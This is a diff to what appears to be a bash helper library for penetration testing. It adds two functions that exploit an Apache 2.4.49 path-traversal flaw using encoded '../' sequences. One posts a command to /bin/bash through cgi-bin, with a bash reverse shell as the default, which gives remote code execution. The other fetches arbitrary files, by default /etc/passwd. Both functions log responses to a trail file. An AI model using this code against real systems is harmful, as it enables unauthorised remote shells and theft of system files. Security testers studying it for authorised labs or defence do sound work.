@@ -73,3 +73,79 @@ escape_regex() {
   local escaped_input="${escaped_input//\//\\/}"
   echo "$escaped_input"
 }
+
+apache_2449_cgi() {
+  local level=$1
+  local port=$2
+  local script=$3
+  local cmd=$4
+  if [[ -z "$level" ]]; then
+    level=4
+  fi
+  if [[ -z "$script" ]]; then
+    script="bin/bash"
+  fi
+  up=""
+  for i in $(seq 1 $level); do
+    up+="../"
+  done
+  path="cgi-bin/$up""$script"
+  echo "Traversing to: $path"
+  path=$(echo $path | sed 's/\.\./%2e%2e/g')
+  if [[ -z "$cmd" ]]; then
+    cmd=$(get_bash_reverse_shell)
+  fi
+  if [[ -z "$port" ]]; then
+    port=80  # Default port if not set
+  fi
+  if [[ -z "$ip" ]]; then
+    echo "IP not set, cannot execute command."
+    return 1
+  fi
+  if [[ -z "$trail_log" ]]; then
+    trail_log="trail.log"
+  fi
+  if [[ -d "$log_dir" ]]; then
+    trail_log="$log_dir/trail.log"
+  fi
+  curl -s --path-as-is -d "$cmd" "http://$ip:$port/$path" | tee -a $trail_log
+
+}
+
+apache_2449_nocgi() {
+  local level=$1
+  local target=$2
+  local output=$3
+  if [[ -z "$level" ]]; then
+    level=4
+  fi
+  up=""
+  for i in $(seq 1 $level); do
+    up+="../"
+  done
+  if [[ -z "$target" ]]; then
+    target="etc/passwd"
+  fi  
+  path="cgi-bin/$up""$target"
+  echo "Traversing to: $path"
+  path=$(echo $path | sed 's/\.\./%2e%2e/g')
+  cmd=$(get_bash_reverse_shell)
+  if [[ -z "$port" ]]; then
+    port=80  # Default port if not set
+  fi
+  if [[ -z "$ip" ]]; then
+    echo "IP or port not set, cannot execute command."
+    return 1
+  fi
+  if [[ -z "$trail_log" ]]; then
+    trail_log="trail.log"
+  fi
+  if [[ -d "$log_dir" ]]; then
+    trail_log="$log_dir/trail.log"
+  fi  
+  if [[ ! -z "$output" ]]; then
+      curl_output_option="-o $output"  
+  fi
+  curl -s $curl_output_option --path-as-is "http://$ip:$port/$path" | tee -a $trail_log
+
+}
